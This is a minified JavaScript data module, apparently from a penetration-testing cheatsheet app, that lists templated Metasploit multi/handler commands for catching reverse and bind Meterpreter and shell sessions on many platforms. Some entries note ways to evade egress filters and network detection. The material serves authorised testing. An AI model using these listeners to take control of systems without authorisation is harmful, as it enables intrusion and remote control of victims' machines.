const e="Metasploit - Listeners & Handlers",t=[{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Windows x64 Meterpreter reverse TCP (stageless)",description:"Generic handler for stageless reverse TCP payloads on any OS.",template:`use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Windows x64 Meterpreter reverse TCP (staged)",description:"Handler for staged payloads. Small stager downloads meterpreter in a second connection.",template:`use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Windows x86 Meterpreter reverse TCP (staged)",description:"Handler for 32-bit Windows staged meterpreter.",template:`use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"80"}],title:"Windows x64 Meterpreter reverse HTTP (staged)",description:"HTTP handler. Traffic looks like web browsing, may bypass strict egress filters.",template:`use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_http
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"443"}],title:"Windows x64 Meterpreter reverse HTTPS (staged)",description:"Encrypted SSL/TLS handler. Harder to detect by network IDS/IPS. Remove HandlerSSLCert if you don't have a custom cert.",template:`use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Linux x64 Meterpreter reverse TCP (stageless)",description:"Handler for Linux x64 stageless meterpreter payloads.",template:`use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Linux x64 shell reverse TCP",description:"Lightweight shell handler for Linux x64. No meterpreter, just a shell.",template:`use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Linux x86 Meterpreter reverse TCP (staged)",description:"Handler for 32-bit Linux staged meterpreter.",template:`use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"macOS x64 Meterpreter reverse TCP (stageless)",description:"Handler for macOS x64 stageless meterpreter payloads.",template:`use exploit/multi/handler
set PAYLOAD osx/x64/meterpreter_reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Android Meterpreter reverse TCP",description:"Handler for Android APK meterpreter payloads.",template:`use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Python Meterpreter reverse TCP",description:"Handler for Python meterpreter. Works cross-platform (Win/Lin/Mac with Python installed).",template:`use exploit/multi/handler
set PAYLOAD python/meterpreter_reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"PHP Meterpreter reverse TCP",description:"Handler for PHP meterpreter. For web servers running PHP.",template:`use exploit/multi/handler
set PAYLOAD php/meterpreter_reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Java Meterpreter reverse TCP",description:"Handler for Java meterpreter. Deploy via WAR files on Tomcat/JBOSS.",template:`use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"Unix Bash reverse shell",description:"Handler for cmd/unix/reverse_bash. Lightweight bash-only reverse shell.",template:`use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST {lhost_ip}
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lport",description:"Local port to bind to",default:"445"}],title:"Windows x64 Meterpreter bind TCP",description:"Bind handler — connects to a port on the target instead of waiting for a reverse connection. Use with bind_tcp payloads.",template:`use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST 10.10.10.20
set LPORT {lport}
set ExitOnSession false
exploit -j`},{args:[{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"53"},{name:"domain",description:"DNS zone domain",default:"your.domain.com"}],title:"DNS handler (reverse DNS)",description:"Handler for DNS meterpreter. Very stealthy but requires DNS zone configuration on your domain.",template:`use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_dns
set LHOST {lhost_ip}
set LPORT {lport}
set DNS_ZONE {domain}
set ExitOnSession false
exploit -j`},{args:[{name:"payload",description:"Full payload path",default:"windows/x64/meterpreter_reverse_tcp"},{name:"lhost_ip",description:"Listener IP",default:"0.0.0.0"},{name:"lport",description:"Listener port",default:"4444"}],title:"One-liner handler (fast setup)",description:"Quick handler setup using the handler command. Supports any -p payload, -H LHOST, -P LPORT.",template:"handler -p {payload} -H {lhost_ip} -P {lport} -z"},{args:[{name:"resource_script",description:"Path to .rc resource script",default:"/tmp/handler.rc"}],title:"Load handlers from a resource script",description:"Execute a pre-written .rc resource file with multi-handler setup.",template:"resource {resource_script}"},{args:[],title:"List all active background jobs",template:"jobs"},{args:[{name:"job_id",description:"Job ID to kill",default:"0"}],title:"Kill a specific background job by ID",template:"jobs -k {job_id}"},{args:[],title:"Kill ALL background jobs",template:"jobs -K"},{args:[{name:"resource_script",description:"Path to resource file",default:"/tmp/multi_listener.rc"}],title:"Resource script: multi-handler for multiple payloads",description:`Example .rc content to start multiple handlers:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j

use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4445
set ExitOnSession false
exploit -j`,template:"resource {resource_script}"}],r={title:e,commands:t};export{t as commands,r as default,e as title};
